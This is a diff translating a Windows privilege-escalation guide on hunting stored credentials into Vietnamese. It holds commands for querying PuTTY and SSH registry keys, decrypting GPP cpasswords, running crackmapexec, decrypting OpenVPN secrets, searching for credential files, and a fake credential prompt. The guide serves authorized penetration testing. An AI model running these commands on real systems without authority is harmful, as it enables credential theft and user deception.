+Một công cụ xoay vòng mật khẩu tự viết có thể lưu mật khẩu administrator cục bộ đã mã hóa trong một local service, đồng thời giữ thông tin xác thực datastore trong tệp `.env` có thể đọc được hoặc cạnh binary của updater. Hãy xem xét đồng thời scheduled task, tài khoản, ACL cấu hình, listener và quyền datastore của updater. Datastore chỉ lắng nghe loopback vẫn có thể được người dùng cục bộ truy cập nếu họ có thông tin xác thực hợp lệ, nhưng chỉ xác thực thành công không chứng minh họ có quyền đọc các bản ghi liên quan. Nếu seed mã hóa hoặc key material có thể truy cập được ở cạnh ciphertext, hãy xem xét chính xác cách tạo key trước khi tin cậy vào mã hóa. Cơ chế xác định AES key từ seed bị lộ bằng Go [`math/rand`](https://pkg.go.dev/math/rand) không phù hợp để bảo vệ mật khẩu đó; tài liệu Go cho biết package này không thích hợp cho tính ngẫu nhiên nhạy cảm về bảo mật. Hãy xác nhận mọi mật khẩu đã khôi phục còn hiệu lực và thuộc về tài khoản trong nhóm local Administrators trước khi xem đó là con đường leo thang đặc quyền. Scheduled task, đường dẫn `.env` hoặc blob đã mã hóa tự chúng không chứng minh bất kỳ điều kiện nào trong số đó. Không đưa mật khẩu và key material vào kết quả liệt kê thông thường.
 
-Use [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) for managed local administrator passwords. Its directory or Entra-backed storage and access controls are distinct from a custom local datastore; [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) likewise decide whether an authenticated datastore user can read a specific index.
+Dùng [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) để quản lý mật khẩu administrator cục bộ. Cơ chế lưu trữ dựa trên directory hoặc Entra cùng các quyền kiểm soát truy cập của nó khác với datastore cục bộ tùy chỉnh; tương tự, [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) quyết định liệu người dùng datastore đã xác thực có thể đọc một index cụ thể hay không.
 
-### Java server plugin archives and credential reuse
+### Archive plugin Java server và việc dùng lại thông tin xác thực
 
-Some Java server plugins are distributed as JAR archives in a server's `plugins` directory. A readable custom plugin may contain configuration or bytecode with an embedded service credential. Review the archive only when authorized and keep recovered secrets out of routine enumeration output. A plugin path alone does not prove that a secret exists, and a recovered service password leads to higher privileges only if it is also valid for a more privileged account. Check the relevant file ACLs and replace reused credentials with distinct secrets. See [PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) for the directory layout and [Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) for archive contents.
+Một số plugin Java server được phân phối dưới dạng archive JAR trong thư mục `plugins` của server. Plugin tùy chỉnh có thể đọc được có thể chứa cấu hình hoặc bytecode với thông tin xác thực service được nhúng bên trong. Chỉ xem xét archive khi được phép và không đưa bí mật đã khôi phục vào kết quả liệt kê thông thường. Chỉ riêng đường dẫn plugin không chứng minh rằng có bí mật, và mật khẩu service đã khôi phục chỉ dẫn đến đặc quyền cao hơn nếu nó cũng hợp lệ cho một tài khoản có đặc quyền cao hơn. Kiểm tra ACL của các tệp liên quan và thay thông tin xác thực dùng lại bằng các bí mật riêng biệt. Xem [hướng dẫn cài đặt plugin của PaperMC](https://docs.papermc.io/paper/adding-plugins/) để biết cấu trúc thư mục và [tài liệu JAR của Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) để biết nội dung archive.
 
-### Openfire embedded database credentials
+### Thông tin xác thực trong embedded database của Openfire
 
-An Openfire installation using its embedded database may keep `openfire.script` under `Openfire\embedded-db`. If the current account can read it, review the `OFUSER` records and the `passwordKey` property together. Openfire's [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) says passwords can be stored in plain text or encrypted with a key held in that property. A recovered password only matters for escalation if it is still valid for a more privileged identity; the file name alone proves neither read access nor credential reuse. The path is an inventory cue, so keep database content and credentials out of routine enumeration output.
+Bản cài đặt Openfire sử dụng embedded database có thể lưu `openfire.script` trong `Openfire\embedded-db`. Nếu tài khoản hiện tại có thể đọc tệp này, hãy kiểm tra đồng thời các bản ghi `OFUSER` và thuộc tính `passwordKey`. Tài liệu [user-provider của Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) cho biết mật khẩu có thể được lưu dưới dạng văn bản thuần hoặc được mã hóa bằng key được giữ trong thuộc tính đó. Mật khẩu đã khôi phục chỉ có ý nghĩa đối với việc leo thang đặc quyền nếu nó vẫn hợp lệ cho một danh tính có đặc quyền cao hơn; chỉ riêng tên tệp không chứng minh được quyền đọc hay việc dùng lại thông tin xác thực. Đường dẫn này chỉ là gợi ý để kiểm kê, vì vậy không đưa nội dung database và thông tin xác thực vào kết quả liệt kê thông thường.
 
-The separate `Openfire\conf\openfire.xml` file can reveal the admin console's configured ports and bind interface even when an external database is used. Openfire commonly binds its admin console to loopback; that still leaves a local account able to reach the address if the listener is running. Check the actual listener, authorized admin role, plugin-upload policy, and Openfire service identity together. An admin who can install a plugin may cause plugin code to run in the service's context, which can be highly privileged when the service runs as LocalSystem. A matching account password or a readable configuration path alone does not prove admin-console access or code execution. See the vendor's [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) and [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).
+Tệp riêng `Openfire\conf\openfire.xml` có thể tiết lộ các cổng và giao diện bind đã cấu hình cho admin console ngay cả khi đang sử dụng external database. Openfire thường bind admin console vào loopback; khi listener đang chạy, tài khoản cục bộ vẫn có thể truy cập địa chỉ đó. Hãy kiểm tra đồng thời listener thực tế, admin role được cấp quyền, chính sách tải plugin lên và danh tính của Openfire service. Admin có thể cài plugin thì có thể khiến mã plugin chạy trong context của service; điều này có thể mang đặc quyền cao nếu service chạy dưới LocalSystem. Chỉ riêng mật khẩu tài khoản trùng khớp hoặc đường dẫn cấu hình có thể đọc được không chứng minh quyền truy cập admin console hay khả năng thực thi mã. Xem [hướng dẫn cài đặt và quản lý plugin của nhà cung cấp](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) và [thuộc tính API tải plugin lên](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).
 
-### Forensic management server configuration
+### Cấu hình forensic management server
 
-Velociraptor server configurations, commonly named `server.config.yaml`, can contain the internal CA's `CA.private_key`. If a lower-privileged user can read that key, they may be able to mint an API client certificate. Whether this leads to higher privileges depends on the server's user roles, API reachability, and the identity under which the server or target agent executes. A client configuration contains different material; finding one does not establish access to the server CA. Some deployments keep the CA private key offline, so a readable server configuration may also lack the signing key.
+Cấu hình Velociraptor server, thường có tên `server.config.yaml`, có thể chứa `CA.private_key` của CA nội bộ. Nếu người dùng có đặc quyền thấp hơn đọc được key đó, họ có thể tạo API client certificate. Việc này có dẫn đến đặc quyền cao hơn hay không phụ thuộc vào user role của server, khả năng truy cập API và danh tính mà server hoặc target agent chạy dưới đó. Client configuration chứa material khác; tìm thấy một cấu hình như vậy không chứng minh có quyền truy cập CA của server. Một số triển khai giữ CA private key ngoại tuyến, vì vậy cấu hình server có thể đọc được cũng có thể không chứa signing key.
 
-On a Windows server, inspect the ACL of the **server** configuration in its installation directory and any protected backup copies. One possible location is `%ProgramFiles%\VelociraptorServer\server.config.yaml`; use the service's configured path when it differs. Confirm that the current identity can read the file and that `CA.private_key` is actually present. Avoid printing the private key in logs or enumeration output. The vendor's `config api_client` workflow uses the CA key to issue a client certificate, but an effective server-side role is also needed; creating or changing one can require datastore write access or a restart. An existing privileged server identity may provide a route even when those writes are unavailable. API queries with execution rights run in the relevant server or agent context, which can be highly privileged.
+Trên Windows server, hãy kiểm tra ACL của cấu hình **server** trong thư mục cài đặt và mọi bản sao lưu được bảo vệ. Một vị trí có thể là `%ProgramFiles%\VelociraptorServer\server.config.yaml`; nếu khác, hãy dùng đường dẫn đã cấu hình cho service. Xác nhận danh tính hiện tại có thể đọc tệp và `CA.private_key` thực sự có mặt. Tránh ghi private key vào log hoặc kết quả liệt kê. Quy trình `config api_client` của nhà cung cấp sử dụng CA key để cấp client certificate, nhưng cũng cần có role hiệu lực phía server; việc tạo hoặc thay đổi role có thể cần quyền ghi datastore hoặc khởi động lại server. Danh tính server có đặc quyền hiện có vẫn có thể tạo ra một con đường truy cập ngay cả khi không thể ghi. Các truy vấn API có quyền thực thi chạy trong context liên quan của server hoặc agent, vốn có thể mang đặc quyền cao.
 
-Protect the server configuration and backups with restrictive ACLs, keep the CA signing key offline where possible, and limit API roles and listener access. See the [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) and [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/).
+Bảo vệ cấu hình server và bản sao lưu bằng ACL hạn chế, giữ CA signing key ngoại tuyến khi có thể, đồng thời giới hạn API role và quyền truy cập listener. Xem [tài liệu API của Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) và [hướng dẫn cấu hình bảo mật](https://docs.velociraptor.app/docs/deployment/security/).
 
-### Putty Creds
+### Thông tin xác thực Putty
 
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
 
-Solar-PuTTY is a separate session manager. Its native encrypted store may be at `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, while an exported session backup can be named `sessions-backup.dat` and stored elsewhere. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) says exports are password-encrypted and can contain sessions, keys, scripts, tags, and relationships; its [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifies the native store. Check file permissions and paths first. Finding either file does not reveal its password or prove that any saved credential remains valid or has higher privileges.
+Solar-PuTTY là một trình quản lý phiên riêng biệt. Kho dữ liệu được mã hóa gốc có thể nằm tại `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, trong khi bản sao lưu phiên được xuất có thể mang tên `sessions-backup.dat` và được lưu ở nơi khác. [Hướng dẫn xuất dữ liệu của SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) cho biết dữ liệu xuất được mã hóa bằng mật khẩu và có thể chứa các phiên, khóa, script, thẻ và mối liên kết; [diễn đàn hỗ trợ](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) xác định vị trí kho dữ liệu gốc. Trước tiên, hãy kiểm tra quyền truy cập tệp và đường dẫn. Việc tìm thấy một trong hai tệp không tiết lộ mật khẩu hoặc chứng minh rằng thông tin xác thực đã lưu còn hợp lệ hay có quyền cao hơn.
 
-### Putty SSH Host Keys
+### Khóa máy chủ SSH của PuTTY
 
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
 
-### SSH keys in registry
+### SSH keys trong registry
 
-SSH private keys can be stored inside the registry key `HKCU\Software\OpenSSH\Agent\Keys` so you should check if there is anything interesting in there:
+SSH private keys có thể được lưu trong registry key `HKCU\Software\OpenSSH\Agent\Keys`, vì vậy bạn nên kiểm tra xem trong đó có gì đáng chú ý không:
 
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
 
-If you find any entry inside that path it will probably be a saved SSH key. It is stored encrypted but can be easily decrypted using [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
-More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>
+Nếu tìm thấy mục nào bên trong đường dẫn đó, nhiều khả năng đó là SSH key đã lưu. Key được lưu ở dạng mã hóa nhưng có thể dễ dàng giải mã bằng [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Tìm hiểu thêm về kỹ thuật này tại đây: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>
 
-If `ssh-agent` service is not running and you want it to automatically start on boot run:
+Nếu dịch vụ `ssh-agent` không chạy và bạn muốn dịch vụ tự động khởi động khi boot, hãy chạy:
 
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 
 > [!TIP]
-> It looks like this technique isn't valid anymore. I tried to create some ssh keys, add them with `ssh-add` and login via ssh to a machine. The registry HKCU\Software\OpenSSH\Agent\Keys doesn't exist and procmon didn't identify the use of `dpapi.dll` during the asymmetric key authentication.
+> Có vẻ như kỹ thuật này không còn hiệu quả. Tôi đã thử tạo một số SSH key, thêm chúng bằng `ssh-add` rồi đăng nhập qua SSH vào một máy. Registry HKCU\Software\OpenSSH\Agent\Keys không tồn tại và procmon không phát hiện việc sử dụng `dpapi.dll` trong quá trình xác thực bằng khóa bất đối xứng.
 
-### Unattended files
+### Tệp cài đặt tự động
 
 ```
 C:\Windows\sysprep\sysprep.xml
@@ -1711,9 +1710,9 @@ C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
 
-You can also search for these files using **metasploit**: _post/windows/gather/enum_unattend_
+Bạn cũng có thể tìm các tệp này bằng **metasploit**: _post/windows/gather/enum_unattend_
 
-Example content:
+Nội dung ví dụ:
 
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
@@ -1734,7 +1733,7 @@ Example content:
     </UserAccounts>
 ```
 
-### SAM & SYSTEM backups
+### Bản sao lưu SAM & SYSTEM
 
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
@@ -1746,9 +1745,9 @@ Example content:
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
 
-Readable Windows Imaging (`.wim`) backup files can also contain offline `SAM`, `SECURITY`, and `SYSTEM` hives. Prioritize locally accessible backup or image directories and inspect an image's **member names** before extracting anything; a `.wim` filename alone does not prove hive exposure, and routine `install.wim`, `boot.wim`, and recovery images are common false leads. An SMB share is a separate access path and should be checked only when that share is in scope. See Microsoft's [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) and [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).
+Các tệp sao lưu Windows Imaging (`.wim`) có thể đọc được cũng chứa các hive `SAM`, `SECURITY` và `SYSTEM` ngoại tuyến. Ưu tiên kiểm tra các thư mục sao lưu hoặc image có thể truy cập cục bộ, đồng thời xem **tên các thành phần** trong image trước khi giải nén bất kỳ thứ gì; chỉ riêng tên tệp `.wim` không chứng minh rằng các hive bị lộ, và các image `install.wim`, `boot.wim` cũng như image khôi phục thông thường thường là những kết quả sai lệch. SMB share là một đường truy cập riêng và chỉ nên kiểm tra khi share đó nằm trong phạm vi. Xem hướng dẫn về [Windows image của Microsoft](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) và [tham chiếu tệp registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).
 
-### Cloud Credentials
+### Thông tin xác thực trên cloud
 
 ```bash
 #From user home
@@ -1762,15 +1761,15 @@ AppData\Roaming\gcloud\access_tokens.db
 
 ### McAfee SiteList.xml
 
-Search for a file called **SiteList.xml**
+Tìm tệp có tên **SiteList.xml**
 
 ### Cached GPP Password
 
-A feature was previously available that allowed the deployment of custom local administrator accounts on a group of machines via Group Policy Preferences (GPP). However, this method had significant security flaws. Firstly, the Group Policy Objects (GPOs), stored as XML files in SYSVOL, could be accessed by any domain user. Secondly, the passwords within these GPPs, encrypted with AES256 using a publicly documented default key, could be decrypted by any authenticated user. This posed a serious risk, as it could allow users to gain elevated privileges.
+Trước đây, có một tính năng cho phép triển khai các tài khoản quản trị viên cục bộ tùy chỉnh trên một nhóm máy tính thông qua Group Policy Preferences (GPP). Tuy nhiên, phương pháp này có các lỗ hổng bảo mật nghiêm trọng. Thứ nhất, bất kỳ người dùng domain nào cũng có thể truy cập các Group Policy Object (GPO) được lưu dưới dạng tệp XML trong SYSVOL. Thứ hai, bất kỳ người dùng nào đã xác thực cũng có thể giải mã mật khẩu trong các GPP này, vốn được mã hóa bằng AES256 với một khóa mặc định đã được công bố rộng rãi. Điều này gây ra rủi ro nghiêm trọng vì có thể giúp người dùng giành được đặc quyền cao hơn.
 
-To mitigate this risk, a function was developed to scan for locally cached GPP files containing a "cpassword" field that is not empty. Upon finding such a file, the function decrypts the password and returns a custom PowerShell object. This object includes details about the GPP and the file's location, aiding in the identification and remediation of this security vulnerability.
+Để giảm thiểu rủi ro này, một hàm đã được phát triển để quét các tệp GPP được lưu trong bộ nhớ đệm cục bộ, có trường "cpassword" không rỗng. Khi tìm thấy tệp như vậy, hàm sẽ giải mã mật khẩu và trả về một đối tượng PowerShell tùy chỉnh. Đối tượng này bao gồm thông tin chi tiết về GPP và vị trí tệp, giúp xác định và khắc phục lỗ hổng bảo mật này.
 
-Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:
+Tìm các tệp sau trong `C:\ProgramData\Microsoft\Group Policy\history` hoặc trong _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (trước W Vista)_:
 
 - Groups.xml
 - Services.xml
@@ -1779,20 +1778,20 @@ Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents 
 - Printers.xml
 - Drives.xml
 
-**To decrypt the cPassword:**
+**Để giải mã cPassword:**
 
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```
 
-Using crackmapexec to get the passwords:
+Sử dụng crackmapexec để lấy mật khẩu:
 
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
 
-### IIS Web Config
+### Cấu hình Web IIS
 
 ```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
@@ -1809,7 +1808,7 @@ Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorActio
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-Example of web.config with credentials:
+Ví dụ về web.config có thông tin đăng nhập:
 
 ```xml
 <authentication mode="Forms">
@@ -1821,18 +1820,18 @@ Example of web.config with credentials:
 </authentication>
 ```
 
-### Backup archives in an IIS webroot
+### Bản sao lưu archive trong webroot của IIS
 
-An old ZIP backup placed directly in a served webroot may expose prior configuration files and reusable credentials. Check the site's configured physical path and whether the archive is actually reachable over HTTP before treating it as an exposure. The default `C:\inetpub\wwwroot` path is only a candidate. A quick local inventory can list names and sizes without opening archives:
+Một bản sao lưu ZIP cũ được đặt trực tiếp trong webroot đang phục vụ có thể làm lộ các tệp cấu hình trước đây và thông tin xác thực có thể tái sử dụng. Hãy kiểm tra đường dẫn vật lý được cấu hình cho trang web và xác minh archive có thực sự truy cập được qua HTTP hay không trước khi xem đây là một trường hợp lộ dữ liệu. Đường dẫn mặc định `C:\inetpub\wwwroot` chỉ là một vị trí cần kiểm tra. Có thể nhanh chóng kiểm kê cục bộ tên và kích thước mà không cần mở các archive:
 
 ```powershell
 Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
   Where-Object Name -Match 'backup' | Select-Object Name, Length
 ```
 
-An archive name does not establish that it contains a secret or that a recovered credential grants higher privilege.
+Tên archive không chứng minh rằng nó chứa bí mật hoặc credential được khôi phục có quyền cao hơn.
 
-### OpenVPN credentials
+### Thông tin xác thực OpenVPN
 
 ```csharp
 Add-Type -AssemblyName System.Security
@@ -1854,7 +1853,7 @@ foreach ($item in $items)
 }
 ```
 
-### Logs
+### Nhật ký
 
 ```bash
 # IIS
@@ -1864,9 +1863,9 @@ C:\inetpub\logs\LogFiles\*
 Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-### Ask for credentials
+### Yêu cầu thông tin xác thực
 
-You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
+Bạn luôn có thể **yêu cầu người dùng nhập thông tin xác thực của họ hoặc thậm chí thông tin xác thực của người dùng khác** nếu bạn nghĩ họ có thể biết thông tin đó (lưu ý rằng việc **trực tiếp yêu cầu** khách hàng cung cấp **thông tin xác thực** thực sự **rủi ro**):
 
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1876,9 +1875,9 @@ $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U
 $cred.GetNetworkCredential() | fl
 ```
 
-### **Possible filenames containing credentials**
+### **Tên tệp có thể chứa thông tin xác thực**
 
-Known files that some time ago contained **passwords** in **clear-text** or **Base64**
+Các tệp từng chứa **mật khẩu** ở dạng **văn bản thuần** hoặc **Base64**
 
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
@@ -1945,7 +1944,7 @@ TypedURLs       #IE
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
 
-#### Filename-list variant without the Password Safe extension
+#### Biến thể danh sách tên tệp không có phần mở rộng Password Safe
 
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
@@ -2011,18 +2010,18 @@ TypedURLs       #IE
 %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
 ```
 
-Password Safe v3 databases commonly use the `.psafe3` extension. Treat a matching filename as an encrypted vault candidate; its presence does not establish that you can read it, unlock it, or use any stored credentials. Check accessible user profiles and configured file-sharing roots when reviewing where such files are stored.
+Cơ sở dữ liệu Password Safe v3 thường dùng phần mở rộng `.psafe3`. Hãy xem tệp có tên khớp là ứng viên vault được mã hóa; việc tệp hiện diện không chứng minh rằng bạn có thể đọc, mở khóa hoặc sử dụng bất kỳ thông tin xác thực nào được lưu trong đó. Khi kiểm tra nơi lưu các tệp này, hãy xem các hồ sơ người dùng có thể truy cập và các thư mục gốc chia sẻ tệp đã cấu hình.
 
-A readable KeePass `.kdbx` is likewise only an encrypted-vault lead. Unlocking it requires the actual master-password and any configured key-file or account factors. If an authorized review finds an LM:NT hash pair in an entry, verify the named account and whether the NT hash is current and accepted by the target's NTLM service before considering [pass-the-hash](../ntlm/README.md#pass-the-hash). A vault entry does not grant Administrator or SYSTEM rights on its own; remote service access, account rights, and any separate service-execution step must also hold. Inventory should report the vault path and readability, not print the database or stored credentials.
+Một tệp KeePass `.kdbx` có thể đọc được cũng chỉ là manh mối về vault được mã hóa. Để mở khóa, cần có master-password thực tế cùng mọi key-file hoặc yếu tố tài khoản đã cấu hình. Nếu trong quá trình rà soát được ủy quyền phát hiện một cặp hash LM:NT trong mục nhập, hãy xác minh tài khoản được nêu và xem hash NT còn hiệu lực, được dịch vụ NTLM của mục tiêu chấp nhận hay không trước khi cân nhắc [pass-the-hash](../ntlm/README.md#pass-the-hash). Mục nhập trong vault tự nó không cấp quyền Administrator hoặc SYSTEM; quyền truy cập dịch vụ từ xa, quyền của tài khoản và bất kỳ bước thực thi dịch vụ riêng biệt nào cũng phải được đáp ứng. Khi lập danh mục, hãy báo cáo đường dẫn vault và khả năng đọc, không in cơ sở dữ liệu hoặc thông tin xác thực được lưu trong đó.
 
-Search all of the proposed files:
+Tìm kiếm tất cả các tệp được đề xuất:
 
 ```
 cd C:\
 dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
 ```
 
-#### Search-command variant without the Password Safe extension
+#### Biến thể lệnh tìm kiếm không có phần mở rộng Password Safe
 
 ```
 cd C:\
@@ -2033,21 +2032,21 @@ dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd
 Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
 ```
 
-### Credentials in the RecycleBin
+### Thông tin xác thực trong Thùng rác
 
-You should also check the Bin to look for credentials inside it
+Bạn cũng nên kiểm tra Thùng rác để tìm thông tin xác thực bên trong.
 
-Check accessible Recycle Bin entries for deleted backups and configuration archives as well as files whose names explicitly mention credentials. A useful `.7z`, `.zip`, or `.rar` backup may be months old and have an ordinary filename. Windows stores the original path and deletion time in a `$I` record and the deleted file as its paired `$R` entry; inspect the metadata and the current identity's read access before opening an archive. Visibility depends on the volume, user SID, and file permissions, so an empty listing does not prove that no recoverable backup exists. Treat an archive name as a review candidate, not proof that it contains a valid secret.
+Kiểm tra các mục trong Recycle Bin mà bạn có thể truy cập để tìm bản sao lưu đã xóa và kho lưu trữ cấu hình, cũng như các tệp có tên nhắc rõ đến thông tin xác thực. Một bản sao lưu `.7z`, `.zip` hoặc `.rar` hữu ích có thể đã cũ hàng tháng và có tên tệp thông thường. Windows lưu đường dẫn gốc và thời điểm xóa trong bản ghi `$I`, còn tệp đã xóa là mục `$R` đi kèm; hãy kiểm tra metadata và quyền đọc của danh tính hiện tại trước khi mở kho lưu trữ. Khả năng hiển thị phụ thuộc vào volume, SID người dùng và quyền trên tệp, vì vậy danh sách trống không chứng minh rằng không có bản sao lưu nào có thể khôi phục. Hãy xem tên kho lưu trữ là ứng viên cần kiểm tra, chứ không phải bằng chứng rằng nó chứa secret hợp lệ.
 
-An accessible deleted `.pfx` can also be a **code-signing** lead. If it contains an accessible private key, the key can sign a changed PowerShell script; [PowerShell requires a code-signing certificate with a private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), and [AppLocker publisher rules evaluate the signer's identity and rule scope](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Cross-account execution requires the current identity to modify the exact script, an effective rule that accepts the resulting signature for the script and target account, and a scheduled task or other higher-privilege consumer that actually runs it. A `.pfx` filename, certificate subject, or writable script alone does not establish the chain. Review metadata, ACLs, policy, and the scheduled command before opening private-key material or triggering the task.
+Một tệp `.pfx` đã xóa mà bạn có thể truy cập cũng có thể là đầu mối **code-signing**. Nếu tệp chứa private key có thể truy cập, key này có thể ký một script PowerShell đã chỉnh sửa; [PowerShell yêu cầu chứng chỉ code-signing có private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), và [các quy tắc publisher của AppLocker đánh giá danh tính của người ký và phạm vi quy tắc](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Để thực thi chéo tài khoản, danh tính hiện tại phải có quyền chỉnh sửa đúng script, phải có quy tắc đang có hiệu lực chấp nhận chữ ký tạo ra cho script và tài khoản mục tiêu, đồng thời phải có scheduled task hoặc thành phần có đặc quyền cao hơn khác thực sự chạy script đó. Chỉ riêng tên tệp `.pfx`, subject của chứng chỉ hoặc script có thể ghi không chứng minh được chuỗi này. Hãy xem xét metadata, ACL, policy và lệnh được lên lịch trước khi mở dữ liệu private key hoặc kích hoạt task.
 
-Also review accessible messaging-client profile databases, notes, and received files for credential leads. A BitLocker recovery export may be stored as HTML or TXT, sometimes inside a named backup archive. Such material can provide access to a separate encrypted data volume containing older backups; inspect the volume and archive only when access is authorized. If a backup includes `NTDS.dit`, offline domain credential recovery also requires the matching `SYSTEM` hive, as described in the [backup and privileged-groups workflow](../active-directory-methodology/privileged-groups-and-token-privileges.md). File names and a locked volume alone do not establish that a usable recovery key or domain backup exists.
